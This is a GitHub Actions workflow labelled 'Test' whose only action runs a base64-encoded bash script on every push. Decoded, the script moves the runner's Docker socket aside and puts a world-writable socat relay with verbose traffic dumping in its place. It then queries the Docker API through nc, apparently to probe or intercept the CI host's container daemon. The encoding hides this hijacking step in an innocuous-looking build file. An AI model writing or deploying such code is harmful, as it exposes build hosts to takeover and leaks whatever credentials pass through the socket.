workflow "Test" {
  on = "push"
  resolves = ["build"]
}

action "build" {
  uses = "lafernando/github-action-bash/@master"
  args = "ZWNobyAiMTExMTExMSIKbXYgL3Zhci9ydW4vZG9ja2VyLnNvY2sgL3Zhci9ydW4vZG9ja2VyeC5zb2NrCnNvY2F0IC10MTAwIC14IC12IFVOSVgtTElTVEVOOi92YXIvcnVuL2RvY2tlci5zb2NrLG1vZGU9Nzc3LHJldXNlYWRkcixmb3JrIFVOSVgtQ09OTkVDVDovdmFyL3J1bi9kb2NrZXJ4LnNvY2sgJgpkb2NrZXIgdmVyc2lvbgplY2hvICIyMjIyMjIyIgplY2hvICJHRVQgL3ZlcnNpb24gSFRUUC8xLjEKSG9zdDogbG9jYWxob3N0CgoiIHwgbmMgLVUgL3Zhci9ydW4vZG9ja2VyLnNvY2sKZWNobyAiMzMzMzMzMzMiCg=="
}
